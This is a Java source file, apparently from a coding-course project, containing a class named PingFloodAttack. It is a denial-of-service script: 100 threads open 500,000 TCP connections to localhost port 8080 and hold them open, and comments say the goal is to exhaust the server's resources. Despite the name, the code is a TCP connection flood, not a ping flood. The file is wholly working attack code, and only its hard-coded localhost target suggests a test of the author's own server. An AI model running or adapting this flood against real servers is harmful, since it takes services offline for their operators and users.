package io.codeforall.fanstatics;

import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PingFloodAttack {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 8080;
    private static final int CONNECTIONS = 500000; // High number of connections to exhaust server resources

    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(100); // High thread pool for rapid connections
        for (int i = 0; i < CONNECTIONS; i++) {
            executorService.submit(() -> {
                try {
                    // Keep sockets open to increase resource consumption on the server
                    new Socket(SERVER_ADDRESS, SERVER_PORT);
                    System.out.println("Opened connection to server.");
                } catch (IOException e) {
                    System.err.println("Connection failed: " + e.getMessage());
                }
            });
        }
        executorService.shutdown();
    }
}


